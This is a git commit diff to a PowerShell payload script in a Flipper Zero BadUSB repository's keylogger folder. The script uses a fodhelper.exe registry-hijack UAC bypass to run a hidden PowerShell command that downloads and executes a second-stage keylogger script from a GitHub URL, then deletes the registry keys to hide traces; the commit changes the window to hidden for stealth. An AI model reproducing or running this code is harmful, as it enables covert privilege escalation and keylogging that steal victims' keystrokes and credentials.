8df1d19f9850dc33844fd17bd90ce9c8ddb9e813
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-23 12:52:03 -0600

    Update s1.ps1

--- Payloads/Flip-Keylogger/s1.ps1
+++ Payloads/Flip-Keylogger/s1.ps1
@@ -5,7 +5,7 @@ function s1 {
 	$user = "$env:COMPUTERNAME\$env:USERNAME"
 	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
 if($isAdmin){
-	$259="powershell.exe -noexit iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 | iex";
+	$259="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 | iex";
 	reg add "HKCU\Software\Classes\.259\Shell\Open\command" /d $259 /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".259" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.259\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
 
 	}
